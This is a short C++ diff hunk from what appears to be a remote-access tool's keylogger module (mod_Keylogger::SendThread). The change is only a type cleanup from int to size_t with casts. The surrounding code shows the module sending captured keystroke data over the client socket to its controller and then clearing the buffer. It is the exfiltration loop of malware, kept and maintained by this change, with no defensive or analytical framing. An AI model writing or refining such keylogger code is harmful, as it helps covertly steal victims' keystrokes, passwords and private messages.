@@ -493,10 +493,10 @@ void mod_Keylogger::SendThread() {
         }
 
         std::string strData = Get_Data();
-        int iData_Size = strData.size();
+        size_t iData_Size = strData.size();
         if (iData_Size > 0) {
-            cCliente->cChunkSend(cCliente->sckSocket, strData.c_str(), iData_Size, 0, true, nullptr, EnumComandos::KL_Salida);
-            Clear_Data(iData_Size+1); // +1 por el byte nulo \0
+            cCliente->cChunkSend(cCliente->sckSocket, strData.c_str(), static_cast<int>(iData_Size), 0, true, nullptr, EnumComandos::KL_Salida);
+            Clear_Data(static_cast<int>(iData_Size)+1); // +1 por el byte nulo \0
         }
         
         std::this_thread::sleep_for(std::chrono::milliseconds(100));
